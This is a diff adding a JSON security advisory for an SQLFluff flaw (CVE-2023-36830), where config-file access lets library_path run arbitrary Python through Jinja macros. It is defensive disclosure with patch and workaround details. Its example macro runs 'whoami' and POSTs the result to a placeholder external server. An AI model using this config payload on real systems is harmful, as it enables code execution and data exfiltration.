@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-jqhc-m2j3-fjrx",
+  "modified": "2023-07-06T21:06:29Z",
+  "published": "2023-07-06T21:05:43Z",
+  "aliases": [
+    "CVE-2023-36830"
+  ],
+  "summary": "SQLFluff users with access to config file, using `libary_path` may call arbitrary python code",
+  "details": "### Impact\nIn environments where untrusted users have access to the config files (e.g. `.sqlfluff`), there is a potential security vulnerability where those users could use the `library_path` config value to allow arbitrary python code to be executed via macros. Jinja macros are executed within a [sandboxed environment](https://docs.snowflake.com/en/sql-reference/sql/show-warehouses) but the following example shows how an external url might be called and used to reveal internal information to an external listener:\n\n```ini\n[sqlfluff:templater:jinja]\nlibrary_path = /usr/lib/python3.9/http\n\n[sqlfluff:templater:jinja:macros]\na_macro_def = {{client.HTTPSConnection('<SOME_EXTERNAL_SERVER_YOU_CONTROL>').request('POST', '/', server.os.popen('whoami').read())}}\n```\n\nFor many users who use SQLFluff in the context of an environment where all users _already have fairly escalated privileges_, this may not be an issue - however in larger user bases, or where SQLFluff is bundled into another tool where developers still wish to give users access to supply their on _rule configuration_, this may be an issue.\n\n### Patches\nThe 2.1.2 release offers the ability for the `library_path` argument to be overwritten on the command line by using [the `--library-path` option](https://docs.sqlfluff.com/en/stable/cli.html#cmdoption-sqlfluff-lint-library-path). This overrides any values provided in the config files and effectively prevents this route of attack for users which have access to the config file, but not to the scripts which call the SQLFluff CLI directly. A similar option is provided for the Python API, where users also have a greater ability to further customise or override configuration as necessary. \n\nUnless `library_path` is explicitly required, we recommend using the option `--library-path none` when invoking SQLFluff which will disable the `library-path` option entirely regardless of the options set in the configuration file or via inline config directives.\n\n### Workarounds\nLimiting access to - or otherwise validating configuration files before they are ingested by SQLFluff will provide a similar effect and does not require upgrade.\n\n### Credit\nDan Amodio from the Tinder Red Team\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "sqlfluff"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.1.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/sqlfluff/sqlfluff/security/advisories/GHSA-jqhc-m2j3-fjrx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36830"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sqlfluff/sqlfluff/commit/6cdc38d76bedab4801b035c04d3c2b3aea17de86"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/sqlfluff/PYSEC-2023-111.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/sqlfluff/sqlfluff"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sqlfluff/sqlfluff/releases/tag/2.1.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-74"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-06T21:05:43Z",
+    "nvd_published_at": "2023-07-06T16:15:10Z"
+  }
+}
